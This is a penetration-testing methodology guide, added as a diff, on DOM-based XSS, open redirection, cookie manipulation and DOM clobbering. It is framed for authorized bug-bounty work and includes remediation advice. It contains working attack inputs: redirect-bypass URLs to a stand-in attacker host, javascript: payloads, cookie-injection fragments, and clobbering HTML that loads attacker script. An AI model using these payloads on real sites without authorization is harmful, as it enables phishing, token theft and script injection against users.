@@ -1,0 +1,448 @@
+# DOM-Based Vulnerabilities — Methodology
+
+A reference workflow for finding and exploiting the broader **DOM-based**
+vulnerability family during authorized testing: DOM XSS from sources other
+than `postMessage`, DOM-based open redirection, DOM-based cookie
+manipulation, and DOM clobbering. Target placeholder throughout: `example.com`.
+
+**Companion documents:**
+- [`postmessage-bugbounty-methodology.md`](./postmessage-bugbounty-methodology.md)
+  — deep-dive on `postMessage` specifically, one DOM-XSS *source* among
+  several covered here. That document assumes you already know the general
+  source/sink model taught in §1–2 below.
+- [`api-credential-access-control-methodology.md`](./api-credential-access-control-methodology.md)
+  — a genuinely different vulnerability class (hardcoded credentials, broken
+  backend access control) that sometimes turns up during the same recon pass
+  as these do, but needs a different testing discipline. Keep them separate.
+
+**Companion reading:** [PortSwigger's XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+is the payload reference to reach for once you've identified a sink and its
+*context* (HTML body, HTML attribute, JS string, URL, CSS) — this document
+tells you how to find and prove the sink exists; the cheat sheet supplies the
+exact payload shape once you know the context. Use them together.
+
+**Companion tooling:** Burp Suite's **DOM Invader** extension (built into
+Burp's embedded browser) is purpose-built for this exact vulnerability class
+— it auto-detects sources/sinks as you browse, and can auto-generate DOM
+clobbering payloads for §5. Worth having enabled for every recon pass in this
+document; treat it as a first-pass accelerant, not a replacement for manually
+reading the code (it will miss custom sinks it doesn't recognize).
+
+---
+
+## 1. What actually makes a vulnerability "DOM-based"
+
+The test that matters, and the one worth applying to *every* finding before
+you file it under this methodology: **could this be exploited with zero
+server involvement in the vulnerable data flow — no request the server has to
+mishandle, just a browser executing client-side script against
+attacker-controllable data already sitting in the page/URL/storage?**
+
+- Reflected XSS: server echoes untrusted input into an HTML response — the
+  *server* is part of the vulnerable flow.
+- Stored XSS: server persists and later serves untrusted input — same.
+- **DOM-based XSS: the vulnerable step happens entirely in client-side
+  JavaScript, reading data from a browser-side source and writing it into a
+  sink, without the server ever seeing or mishandling the payload in that
+  request/response pair.** The URL fragment (`#...`) is the canonical
+  example — it's never even sent to the server, so no server-side scanner or
+  log will ever see the "attack."
+
+This distinction isn't academic — it changes your tooling (server-side
+scanners are blind to DOM XSS by construction) and it changes how you
+classify findings. If you can reproduce something with `curl` alone, no
+browser, it is **not** DOM-based, regardless of where you found the leading
+clue (e.g., a hardcoded credential discovered while reading client-side JS is
+still not a DOM vulnerability — see the companion access-control doc).
+
+---
+
+## 2. The DOM-XSS source/sink model
+
+Same mental model as the postMessage document's "triangle," generalized: a
+**source** (attacker-influenceable data already available client-side) flows,
+possibly through some processing, into a **sink** (a JS/DOM API that can turn
+a string into executed code, a navigation, a cookie, or a DOM structure).
+Every entry in this document is this same shape with a different source
+and/or sink.
+
+### 2.1 Sources
+
+| Source | Attacker control | Notes |
+|---|---|---|
+| `location.hash` | Full — set via URL fragment, **never sent to the server** | The classic DOM-XSS source; also why DOM XSS is often unfixable by a WAF |
+| `location.search` | Full — query string | Sent to server too, but often read again client-side for SPA routing |
+| `location.href` / `location.pathname` | Full, via navigation | Some apps parse routing info back out of the full URL |
+| `document.referrer` | Attacker-controlled if they linked you here; empty under `Referrer-Policy: no-referrer` or cross-origin `noreferrer` links | Easy to overlook as a source since it "feels" server-supplied |
+| `document.cookie` | Attacker-controlled if they can set a cookie for the domain (subdomain cookie, or an earlier DOM-cookie-manipulation bug — see §4) | Chainable: one cookie-write bug can seed a second read-side bug |
+| `window.name` | Full — persists **across navigations**, including cross-origin ones | Underused source; a same-tab navigation chain can smuggle data in even after leaving the attacker's own page |
+| `postMessage` (`e.data`) | Full, from any page that can get the victim to load it | Covered in depth in the companion document |
+| `localStorage` / `sessionStorage` | Depends — only directly attacker-controlled if there's a separate injection point (e.g. another XSS, or a same-origin subdomain with looser rules writing to shared storage) | Still worth checking: a low-severity issue elsewhere can become a source for a high-severity sink here |
+| DOM-clobbered globals | Full, via injected HTML (no `<script>` needed) | See §5 — the source itself is the attacker's HTML, not a URL/browser API |
+
+### 2.2 Sinks
+
+| Sink | Example | Primitive |
+|---|---|---|
+| `eval()` / `Function()` / `setTimeout(str, ...)` / `setInterval(str, ...)` | `eval(location.hash.slice(1))` | Direct code execution |
+| `document.write()` / `document.writeln()` | `document.write(location.hash)` | Markup injection, executes in document context |
+| `.innerHTML` / `.outerHTML` / `insertAdjacentHTML()` | `el.innerHTML = location.hash` | Classic markup-based XSS |
+| `location` / `location.href` / `location.assign()` / `location.replace()` | `location = location.hash.slice(1)` | `javascript:` URI execution, or open redirect (§3) |
+| `element.src` (`script`, `iframe`, `img`, `object`, `embed`) | `iframe.src = location.hash.slice(1)` | Script load, or `javascript:` navigation for framing-capable elements |
+| `document.cookie` (as a **sink**, not just a source) | `document.cookie = "lastPage=" + location.hash` | DOM-based cookie manipulation — §4 |
+| jQuery `$()`, `.html()`, `.append()`, `.attr()` | `$(location.hash)` | jQuery's `$()` sink-behavior on strings starting with `<` — a very common real-world variant |
+| `Range.createContextualFragment()` | | Parses a string to a DOM fragment — same risk as `innerHTML` |
+| `DOMParser.parseFromString()` (with `text/html`) | | Same risk class again |
+| `WebSocket(url)` / `XMLHttpRequest.open(method, url)` | | Sink for URL-shaped data — SSRF-adjacent client-side, or protocol-smuggling |
+
+Use §2.1 × §2.2 as a matrix: for any given target, grep for every sink in
+§2.2, then trace backward to see if any §2.1 source reaches it, possibly
+through several hops of variable assignment/function calls.
+
+---
+
+## 3. DOM-based open redirection
+
+**Shape:** a source (usually a query parameter or hash value — commonly named
+`returnUrl`, `redirect`, `next`, `continue`, `dest`) flows into a navigation
+sink (`location`, `location.href`, `location.replace()`, `window.open()`)
+without validating that the resulting destination stays on the same site.
+
+```js
+// example.com's post-login redirect logic:
+const params = new URLSearchParams(location.search);
+const returnUrl = params.get('returnUrl');
+if (returnUrl) {
+  location.href = returnUrl; // no validation at all
+}
+```
+
+### 3.1 Testing methodology
+
+1. Identify the sink (`location`-family assignment) and trace back to its
+   source (§2.1) — usually a URL parameter, occasionally a fragment.
+2. Try an absolute, fully-attacker-controlled URL first:
+   `https://example.com/login?returnUrl=https://attacker.tld` — if that
+   redirects off-site with zero validation, you're done (Pattern: no
+   validation at all).
+3. If there's validation, it commonly assumes **relative paths only** and
+   checks something like "does it start with `/`?" — bypass patterns to try,
+   roughly in order of how often they work in practice:
+   - **Protocol-relative URL:** `//attacker.tld` — starts with `/`, but
+     browsers resolve a leading `//` as "same scheme, different host."
+   - **Backslash confusion:** `/\attacker.tld` or `\/attacker.tld` — some
+     browsers/parsers normalize backslashes to forward slashes *after* the
+     validation check ran, but *before* navigation.
+   - **Embedded credentials/userinfo trick:** `https://example.com@attacker.tld`
+     — if validation only checks the string *starts with* `https://example.com`,
+     this satisfies that naive check while actually navigating to
+     `attacker.tld` (the part before `@` is HTTP userinfo, not the host).
+   - **Whitespace/control-character prefix:** a leading tab/newline/null byte
+     before `https://attacker.tld` sometimes survives a same-origin-prefix
+     check that uses `.startsWith()` but gets stripped by the browser's own
+     URL parser before navigation.
+   - **Open redirect chaining:** if `example.com` itself has *any* other
+     legitimate open-redirect endpoint, `returnUrl=/legit-redirect-endpoint?to=https://attacker.tld`
+     can satisfy a same-origin check while still ending up off-site after a
+     second hop.
+4. If the sink also happens to accept a `javascript:` scheme (some
+   `location =` assignments do, depending on browser/context), this escalates
+   from an open redirect straight into DOM XSS — always test
+   `returnUrl=javascript:alert(document.domain)` alongside the redirect
+   payloads above, not as a separate pass.
+
+### 3.2 Impact framing
+
+Open redirect alone is often under-valued by programs (many treat it as
+informational) — the impact case that gets taken seriously is usually
+**chained**: phishing credibility (a redirect through the real, trusted
+`example.com` login domain before landing on an attacker page defeats the
+"check the URL bar" advice most users are given), or **OAuth/SSO token
+theft** if the redirect target is the `redirect_uri`/callback step of an auth
+flow — an attacker-controlled final hop there can capture an auth code or
+token intended for the legitimate app.
+
+---
+
+## 4. DOM-based cookie manipulation
+
+**Shape:** a source (again, usually `location.hash` or `location.search`)
+flows into a `document.cookie` **write**, without sanitizing characters that
+have special meaning in the `Set-Cookie`-style grammar the DOM API also
+respects — critically, `;` (attribute delimiter).
+
+```js
+// example.com stores the last-viewed section in a cookie, sourced from the hash:
+document.cookie = "lastSection=" + location.hash.slice(1);
+```
+
+### 4.1 Why the `;` matters
+
+`document.cookie = "name=value"` parses the assigned string the same way a
+`Set-Cookie` header would — a `;` starts a new attribute (or, positioned
+right, a whole new cookie in some parsing contexts). If `location.hash` is
+concatenated in unsanitized:
+
+```
+https://example.com/#foo; sessionid=attacker-controlled-value
+```
+
+can inject a *second* cookie name/value pair (or overwrite an existing
+cookie's value if the name collides) purely client-side, no server request
+involved. This becomes serious when:
+- The overwritten/injected cookie is one the application's **own logic**
+  trusts for something (a feature flag, a CSRF token echo, a
+  language/locale selector that's later read back into another sink — chain
+  this into §2's sink table again once you've landed a value).
+- Combined with a **second, separate** DOM-XSS bug elsewhere that reads
+  `document.cookie` as its *source* — the cookie-write bug becomes the
+  delivery mechanism for the second bug, since you don't need to control the
+  page the second bug lives on, just get the victim to visit the
+  cookie-writing page once first (cookies persist across page loads on the
+  same domain).
+
+### 4.2 Testing methodology
+
+1. Grep for `document.cookie\s*=` (a write, not just `document.cookie` reads)
+   and trace what flows into the right-hand side.
+2. Confirm whether `;`, `=`, and whitespace are stripped/encoded before the
+   assignment. If not, test with a fragment like
+   `#x=1; anothercookie=poc` and confirm via DevTools **Application → Cookies**
+   panel that a second cookie actually landed.
+3. Look specifically for what *other* code reads the cookie you can now
+   influence — that's where actual impact lives; the write primitive alone is
+   rarely the full story.
+
+---
+
+## 5. DOM clobbering — thinking like the parser, not the developer
+
+This is the section most directly in the spirit of *JavaScript for
+Hackers*-style thinking: the bug isn't in application logic at all, it's in
+a browser behavior most developers don't know exists, which is exactly why
+it survives in production code that looks completely safe on read-through.
+
+### 5.1 The core mechanic: named access on `window` and `document`
+
+When the HTML parser encounters certain elements with an `id` or `name`
+attribute, the browser automatically creates a **global reference** to that
+element — on `window` for a specific allow-listed set of tag names
+(`a`, `applet`, `area`, `embed`, `form`, `frameset`, `frame`, `iframe`,
+`img`, `object`), and on `document` for essentially any element with an `id`
+or `name` (via `document.<id>` / `document.all.<id>`-style named access).
+
+**This happens purely from HTML parsing — before any `<script>` on the page
+has executed a single line.** That's the whole exploit primitive: an
+attacker who can inject HTML but **not** `<script>` tags or `on*=` event
+handlers (i.e., they got past an HTML sanitizer that specifically strips
+those) can still influence what a global variable *is*, simply by injecting
+an element with a matching `id`.
+
+```html
+<!-- Attacker-controlled HTML, script tags stripped by a sanitizer, this survives: -->
+<a id="config" href="//attacker.tld/x"></a>
+```
+
+If `example.com`'s own script later does something like:
+
+```js
+if (typeof config === 'undefined') {
+  config = {}; // "safe default", or so the developer assumed
+}
+// ... later:
+loadScript(config.apiEndpoint);
+```
+
+`config` was never actually declared by the page's own script in this
+example — the `<a id="config">` element clobbered it first. `typeof config`
+is `'object'` (an `HTMLAnchorElement`), not `'undefined'`, so the "safe
+default" branch never runs, and `config.apiEndpoint` reads a property off the
+DOM element instead of the intended object — usually `undefined`, **unless**
+the attacker also nests a named child to clobber that specific property too
+(see §5.2).
+
+### 5.2 Building multi-level clobbers (nested named access)
+
+A single `<a id=x>` only gets you `window.x` as an element with element
+properties (`.href`, `.src`, `.toString()`, etc. — themselves sometimes
+directly useful as attacker-controlled strings, since `.toString()` on an
+anchor returns its resolved `href`). To clobber a **property path**
+(`config.apiEndpoint`, not just bare `config`), nest a named form control:
+
+```html
+<form id="config">
+  <input name="apiEndpoint" value="https://attacker.tld/evil.js">
+</form>
+```
+
+`window.config` is now the `<form>` element, and `window.config.apiEndpoint`
+resolves to the nested named `<input>` — whose `.value` (or, for some
+element/attribute combinations, `.toString()`) is fully attacker-controlled
+text. This is the standard "two-level clobber" primitive — extend the same
+pattern for deeper property chains by nesting further, though reliability
+drops as chains get longer and you should verify each level actually
+resolves the way you expect in the target browser rather than assuming.
+
+**A second useful primitive: id-collision producing a collection.** Multiple
+elements sharing the same `id` don't clobber-and-overwrite each other —
+`window.<id>` becomes an `HTMLCollection` of all of them, which itself has
+further quirky property-access behavior (named access *into* the collection
+by a second matching `name`) — worth knowing exists, less commonly needed
+than the single-element or form-nesting primitives above.
+
+### 5.3 "Exploiting DOM clobbering to enable XSS" — pattern to look for
+
+The lab-shape version of this: application code trusts a DOM-clobberable
+global as the **source of a URL later used in a script-loading sink**
+(dynamically creating a `<script src=...>`, or an `import()`-like dynamic
+load) — clobber the global to point that load at attacker-controlled JS,
+which then executes with full page privileges once loaded. The clobber
+itself doesn't execute code; it **redirects what code gets loaded/trusted
+next**. Test methodology:
+
+1. Find a variable read with an "is it defined?" guard
+   (`typeof x === 'undefined'`, `if (!x)`, `x || defaultVal`) whose *fallback*
+   branch would be safe, but whose *clobbered* branch (the guard evaluating
+   falsy-but-not-actually-undefined, or truthy-with-wrong-shape) reaches a
+   dangerous sink.
+2. Confirm the page has an HTML injection point that survives whatever
+   sanitizer is in front of it (this is usually a **separate, lower-severity
+   bug on its own** — e.g. a markdown renderer that allows `id` attributes
+   through, or a profile-bio field that permits a safe-looking tag allowlist)
+   — DOM clobbering is fundamentally a **chaining** technique, rarely the
+   entire vulnerability by itself.
+3. Craft the clobbering HTML to satisfy the exact property path the sink
+   reads, and confirm via DevTools that `window.<name>` resolves the way you
+   expect before assuming the full chain will work.
+
+### 5.4 "Clobbering DOM attributes to bypass HTML filters" — a different angle
+
+A related but distinct use of the same primitive: instead of clobbering an
+*application* variable, clobber a property the **sanitizer itself** reads to
+make a security decision — e.g. a client-side HTML-cleaning routine that
+checks `node.nodeName`, `node.attributes`, or a similar DOM property to
+decide whether to strip an element, where that property can itself be
+shadowed/clobbered by a crafted child element with a matching `name`
+(`<input name="nodeName">` inside the node being checked, if the sanitizer
+naively reads `el.nodeName` without confirming it's actually the built-in
+getter rather than a clobbered own-property). This is a filter-evasion
+technique specifically, not a "make a variable wrong" technique — the target
+of the clobber is the security control's own introspection, not application
+business logic.
+
+### 5.5 What to look for as tells (fast triage before deep-diving)
+
+- Client-side code with `typeof X === 'undefined'` / `X = X || {}` /
+  `if (!window.X)` guard patterns, especially around config objects,
+  feature flags, or anything loaded conditionally.
+- Any client-side HTML sanitizer/cleaner that isn't a well-known hardened
+  library (DOMPurify et al. handle clobbering-adjacent cases deliberately) —
+  homegrown sanitizers are the highest-yield target for §5.4.
+- An HTML injection point that strips `<script>` and `on*=` handlers but
+  permits `id`/`name` attributes on otherwise-"safe" tags (`<a>`, `<form>`,
+  `<img>`) — this is the actual prerequisite that makes clobbering reachable
+  at all; without *some* HTML injection point, there's nothing to clobber
+  with.
+
+---
+
+## 6. Recon toolkit for this whole family
+
+Builds on the postMessage document's §4, generalized:
+
+1. **DOM Invader** (Burp's embedded browser) — enable it, browse the target
+   normally, let it flag sources/sinks and offer to auto-test DOM clobbering
+   candidates. Fastest first pass across a whole app.
+2. **Manual sink-grepping**, expanded beyond `postMessage`:
+   ```bash
+   grep -nE "\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML\(" -r ./bundle/
+   grep -nE "document\.write(ln)?\(" -r ./bundle/
+   grep -nE "\beval\(|new Function\(" -r ./bundle/
+   grep -nE "location(\.href)?\s*=|location\.(assign|replace)\(" -r ./bundle/
+   grep -nE "document\.cookie\s*=" -r ./bundle/
+   grep -nE "typeof\s+\w+\s*===?\s*['\"]undefined['\"]" -r ./bundle/  # clobbering-guard candidates
+   ```
+3. **DevTools breakpoints beyond Event Listener Breakpoints:** "DOM Change
+   Breakpoints" (right-click an element → Break on → subtree/attribute
+   modifications) catch dynamic `innerHTML` writes you can't easily grep for
+   in heavily-templated frameworks; "URL Change" / hash-change listeners for
+   SPA-routed `location.hash` sinks.
+4. **View-source / Sources pretty-print** as always — DOM clobbering
+   candidates specifically reward reading the *whole* file for guard-pattern
+   variable names, not just grepping sink function calls, since the
+   vulnerable line (the guard) and the dangerous line (the sink) are often
+   far apart in the same file.
+
+---
+
+## 7. Suggested lab progression
+
+Roughly ascending difficulty, matching PortSwigger's own tiering — useful as
+a study order if you're building this skill systematically alongside
+*JavaScript for Hackers*:
+
+1. **DOM XSS, direct sink** (`location.hash` → `eval`/`innerHTML`) — confirms
+   the basic source/sink model.
+2. **DOM XSS using web messages** (`postMessage` as source) — see companion
+   document; same sink types, different source, adds origin-validation
+   reasoning on top.
+3. **DOM-based open redirection** (§3) — same source/sink model, but the sink
+   is navigation rather than code execution; teaches URL-parsing-mismatch
+   thinking (browser vs. naive string check) that recurs constantly.
+4. **DOM-based cookie manipulation** (§4) — introduces sink-as-source
+   chaining (a write bug becomes a read bug's delivery mechanism).
+5. **DOM clobbering — enabling XSS** (§5.3) — requires holding two
+   simultaneous mental models (parser-time HTML behavior + runtime JS
+   variable resolution) rather than just source→sink tracing; the jump in
+   PortSwigger's own difficulty rating (Practitioner → Expert) reflects that.
+6. **DOM clobbering — bypassing HTML filters** (§5.4) — hardest variant:
+   requires understanding *both* the application's intended sanitizer logic
+   *and* the clobbering primitive well enough to attack the sanitizer's own
+   assumptions, not just application business logic.
+
+---
+
+## 8. Reporting checklist
+
+- [ ] Exact source (§2.1) and sink (§2.2), named against this document's
+      taxonomy.
+- [ ] For open redirect: which specific bypass class (§3.1) worked — "no
+      validation," "protocol-relative," "userinfo trick," etc. — named
+      explicitly, not just "bypassed the filter."
+- [ ] For cookie manipulation: the injected cookie's actual downstream
+      effect (what reads it, and what changes because of the injected
+      value) — a bare "I can set an arbitrary cookie" without a consumer is
+      a weak report on its own.
+- [ ] For DOM clobbering: **both** halves of the chain — the HTML injection
+      point that delivers the clobbering markup, *and* the guard/sink pair
+      it defeats. A clobbering PoC with no realistic injection point isn't
+      reportable as-is; note explicitly if the injection point is itself a
+      separate, already-known/reported issue you're chaining into.
+- [ ] PoC HTML, `example.com` placeholders clearly marked.
+- [ ] Screenshot/recording of the PoC firing, plus (for clobbering
+      specifically) a DevTools console screenshot showing the clobbered
+      global's actual runtime value/type — this is often the single most
+      convincing piece of evidence for a triager unfamiliar with the
+      technique, since it makes the "the browser did this, not a script"
+      point concrete.
+- [ ] Suggested remediation, tailored to the specific bug:
+  - Open redirect: validate against a strict allowlist of destinations, or
+    require relative paths and reject anything containing `//`, `\`, or a
+    scheme.
+  - Cookie manipulation: encode/strip `;`, `=`, and control characters
+    before any `document.cookie` write built from page-controlled data.
+  - DOM clobbering: use `Object.create(null)` or a `const`/`let` module-scope
+    binding instead of an implicit-global/`var` pattern that's shadowable by
+    named DOM access in the first place; never trust `typeof x === 'undefined'`
+    as proof `x` is safe to initialize — check `x instanceof ExpectedType`
+    or similar instead.
+
+---
+
+## 9. Guard rails for testing on live/production targets
+
+Same as the postMessage document's §10 — confirm scope, use benign
+non-destructive PoCs (`alert(document.domain)`, `print()`, your own
+OAST/collaborator callback), don't exfiltrate real data, don't persist
+stored-XSS-shaped payloads on shared production state beyond what's needed
+to prove the bug once.
